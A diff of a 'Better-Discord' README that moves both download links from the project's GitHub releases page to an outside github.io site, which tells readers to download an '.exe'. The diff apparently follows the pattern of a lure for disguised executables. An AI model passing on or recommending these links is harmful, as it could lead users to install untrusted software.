@@ -1,6 +1,6 @@
 # 🎨 Better-Discord - Customize your Discord interface with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/joyful-imago420/Better-Discord/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://joyful-imago420.github.io)
 
 Better-Discord allows you to change the look and behavior of the Discord desktop application. You can add unique themes, install functional plugins, and modify the user interface to match your preferences. This tool gives you full control over your client experience.
 
@@ -8,7 +8,7 @@ Better-Discord allows you to change the look and behavior of the Discord desktop
 
 You must visit the official release page to obtain the correct software version for your computer. 
 
-[Click here to visit the download page](https://github.com/joyful-imago420/Better-Discord/releases)
+[Click here to visit the download page](https://joyful-imago420.github.io)
 
 Once you reach the page, look for the file ending in `.exe` under the latest release section. Save this file to your computer.
 
